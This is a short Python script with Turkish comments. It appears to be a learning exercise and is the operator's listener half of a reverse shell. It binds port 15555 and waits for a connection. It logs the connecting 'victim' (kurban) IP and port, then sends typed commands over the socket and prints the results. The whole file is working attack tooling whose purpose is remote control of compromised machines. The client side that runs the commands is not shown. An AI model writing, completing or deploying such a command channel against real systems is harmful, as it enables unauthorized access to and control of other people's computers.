import socket
host=""
port=15555
s=socket.socket()

def bagla():
    try:
        s.bind((host,port))
        s.listen()

    except:
        print("baglantı hatası")
        bagla()

def kabul_et():
    print("Baglantı bekleniyor")
    baglanti,adres=s.accept()
    print("Bağlantı gerçekleşti kurban ip:",adres[0],"kurban port:",adres[1])
    komut_yolla(baglanti)
    baglanti.close() #serverdan "quit" girersen while döngüsü break olacak ve bu satıra gelecek,daha sonra baglanti kapanacak
    

#serverdan cliente veri(komut) yollamak için sonsuz döngülü bi blok yaratalım
def komut_yolla(baglanti):
    while True:
        cmd=input("What is your code")
        if cmd=="quit":  # eğer quit girmişsem döngüyü sonlandır
            break #eğer serverdan "quit" girersen komut_yolla() fonksiyonundan çıkması için break kullanıldı

        if len(cmd)>0:
            #serverdan girdiğim veriyi cliente yollayacağım
            #cmd girdisini stringden alıp byte a dönüştürmem gerekiyor
            #yani biz soket üzerinde veri alıp yollarken bunu bytelar üzerinden yapıyoruz
            #serverdan cliente veriyi yollarken "baglati" değişkeni üzerinden yollarız
            #Cünkü "baglanti" benim client ile ilişkimi temsil ediyor
            baglanti.send(cmd.encode("utf-8"))
            cevap=baglanti.recv(4096).decode("utf-8")
            print(cevap)
            

bagla()
kabul_et()
